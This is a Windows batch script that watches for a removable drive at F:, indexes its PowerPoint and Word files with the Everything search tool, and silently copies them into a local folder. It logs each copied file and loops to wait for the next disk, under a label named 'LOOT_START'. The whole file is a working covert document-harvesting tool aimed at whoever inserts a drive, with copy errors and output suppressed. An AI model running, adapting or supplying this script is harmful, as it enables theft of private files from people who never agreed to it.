@echo off
setlocal enabledelayedexpansion
chcp 65001 > NUL

:: configs
  set extensions=ppt pptx doc docx
  set drive_letter=F
  set new_disk_delay=5
  set interval=2
  set index_path=u.txt
  set log_path=.log
  set tmp_path=num.txt
  set bak_path=tet

call:lg
echo LAUNCH>> %log_path%
set waiting=true

:LOOT_START
  IF not exist %drive_letter%:\ (
    IF %waiting%==false (
      call:lg
      echo waiting for next disk>> %log_path%
    )
    set waiting=true
    goto DELAY
  )
  IF %waiting%==false (goto DELAY)
  :: new disk
  call:lg
  echo new disk!>> %log_path%
  timeout /t %new_disk_delay% /nobreak > NUL
  :: generate index
  set exts=""
  for %%e in (%extensions%) do (
    set exts="!exts:~1,-1!ext:%%e^^^|"
  )
  es -path %drive_letter%:\ -sort-size-ascending -s %exts:~1,-2% -export-txt %index_path%
  :: get the number of files
  type %index_path% | find /c /v "" > %tmp_path%
  for /f "tokens=*" %%i in ('type %tmp_path%') do (
    IF %%i==0 (
      set waiting=true
      goto DELAY
    ) ELSE (
      set /a num=%%i
    )
  )
  del %tmp_path%
  call:lg
  echo find %num% files>> %log_path%
  :: copy files
  for /f "tokens=*" %%i in ('type %index_path%') do ( 
    call:lg
    echo bak %%i>> %log_path%
    copy "%%i" %bak_path% 1> NUL 2> NUL
  )
  del %index_path%
  set waiting=false
  :DELAY
  timeout /t %interval% /nobreak > NUL
goto LOOT_START

:: fuction: echo log prefix
:lg
  echo|set /p=[%date% %time%]>> %log_path%
goto:EOF